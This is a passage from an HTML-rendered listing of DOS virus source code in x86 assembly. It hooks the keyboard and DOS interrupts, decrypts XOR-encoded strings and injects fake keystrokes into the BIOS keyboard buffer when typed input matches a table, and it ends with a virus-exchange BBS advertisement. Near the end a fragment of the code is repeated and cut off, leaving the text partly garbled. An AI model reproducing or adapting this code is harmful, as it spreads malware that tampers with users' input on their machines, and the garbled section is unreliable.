</span><span class="sc5">BP0530</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">POPF</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INT_21</span><span class="sc0">          </span><span class="sc1">; Interrupt 21H</span><span class="sc0">

    </span><span class="sc1">; Interrupt 16H routine</span><span class="sc0">

</span><span class="sc5">BP0540</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSHF</span><span class="sc0">               </span><span class="sc1">; Fake an interrupt</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Get a token function?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0550</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">POPF</span><span class="sc0">                </span><span class="sc1">; Fake interrupt not needed</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INT_16</span><span class="sc0">          </span><span class="sc1">; Pass on to original interrupt</span><span class="sc0">

</span><span class="sc5">BP0550</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">INT_16</span><span class="sc0">          </span><span class="sc1">; Deal with original interrupt</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; \ Set ES to zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc5">OUT_SW</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Is output switch on?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0630</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">          </span><span class="sc1">; Convert to lower case</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0AFH</span><span class="sc0">         </span><span class="sc1">; Decrypt character</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TABLE</span><span class="sc0">     </span><span class="sc1">; Address first entry</span><span class="sc0">
</span><span class="sc5">BP0560</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Is this the end of the table?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0590</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get current character pointer</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Add current entry pointer</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Is character the one we want?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0570</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; Clear character pointer</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0580</span><span class="sc0">

</span><span class="sc5">BP0570</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">BP0580</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Next entry</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0560</span><span class="sc0">          </span><span class="sc1">; Process next entry</span><span class="sc0">

</span><span class="sc5">BP0590</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">TABLE</span><span class="sc0">     </span><span class="sc1">; Address first entry</span><span class="sc0">
</span><span class="sc5">BP0600</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Is this the end of the table?</span><span class="sc0">
    </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">BP0610</span><span class="sc0">          </span><span class="sc1">; Branch if yes</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get current character pointer</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Do we have a complete match?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0620</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">TABOUT</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">       </span><span class="sc1">; Save relevant pointer</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc5">OUT_SW</span><span class="sc0">          </span><span class="sc1">; Set on output switch</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; \ Address RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">RAM40</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW041A</span><span class="sc0">       </span><span class="sc1">; Get key token in pointer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW041C</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Set key token out pointer</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0640</span><span class="sc0">          </span><span class="sc1">; Put a character into the buffer</span><span class="sc0">
</span><span class="sc5">BP0610</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">IRET</span><span class="sc0">

</span><span class="sc5">BP0620</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Next entry</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0600</span><span class="sc0">          </span><span class="sc1">; Process next entry</span><span class="sc0">

</span><span class="sc5">BP0630</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">          </span><span class="sc1">; \ Address RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP0640</span><span class="sc0">          </span><span class="sc1">; Put a character into the buffer</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get current character pointer</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Add entry pointer</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; Was that the last character?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0610</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">OUT_SW</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; Set off output switch</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">BP0610</span><span class="sc0">

</span><span class="sc5">BP0640</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc5">TABOUT</span><span class="sc0">       </span><span class="sc1">; Address relevant table entry</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get current character pointer</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Add entry pointer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Get the character</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0AFH</span><span class="sc0">         </span><span class="sc1">; Decrypt character</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Next character</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Copy for translate</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">KEYTAB</span><span class="sc0">    </span><span class="sc1">; Address key number table</span><span class="sc0">
    </span><span class="sc6">XLAT</span><span class="sc0">                </span><span class="sc1">; Get key number</span><span class="sc0">
    </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Reserve order</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">BW041C</span><span class="sc0">       </span><span class="sc1">; Get key token out pointer</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Put key token into buffer</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; \ Next buffer position</span><span class="sc0">
    </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">BW0482</span><span class="sc0">       </span><span class="sc1">; Passed end of buffer?</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP0650</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">BW0480</span><span class="sc0">       </span><span class="sc1">; Get buffer start</span><span class="sc0">
</span><span class="sc5">BP0650</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW041C</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">       </span><span class="sc1">; Save new key token out pointer</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Stack area - This is also necessary to make the virus a complete</span><span class="sc0">
    </span><span class="sc1">; number of paragraphs</span><span class="sc0">

    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">031H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A5H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">031H</span><span class="sc0">

</span><span class="sc5">ENDADR</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

    </span><span class="sc9">END</span><span class="sc0"> </span><span class="sc5">START</span><span class="sc0">
</span><span class="sc5">ete</span><span class="sc0">
    </span><span class="sc1">; number of paragraphs</span><span class="sc0">

    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">04CH</span><span class="sc4">,</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ&gt; and Remember Don't Forget to Call &lt;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤ&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;ฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">

</span></div></body>
</html>
